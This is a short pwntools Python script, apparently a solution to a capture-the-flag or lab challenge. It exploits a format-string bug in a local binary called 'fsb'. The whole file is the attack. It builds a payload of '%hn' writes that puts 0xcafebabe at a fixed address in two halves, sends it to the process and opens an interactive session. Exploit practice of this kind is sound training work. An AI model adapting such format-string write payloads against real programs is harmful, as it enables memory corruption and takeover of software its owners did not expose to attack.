from pwn import *

e = ELF('./fsb')

p = e.process()

top_secret = 0x404050
target_value = 0xcafebabe

pay = b''
target = 0x404068
low = target_value & 0xffff
high = target_value // 0x10000 & 0xffff



fsb_pay = f'%{low}c%9$hn%{high-low}c%10$hn'
pay += fsb_pay.encode() + p64(target) + p64(target + 2)

# print(len(fsb_pay))

p.recvline()
pause()
p.send(pay)
p.interactive()
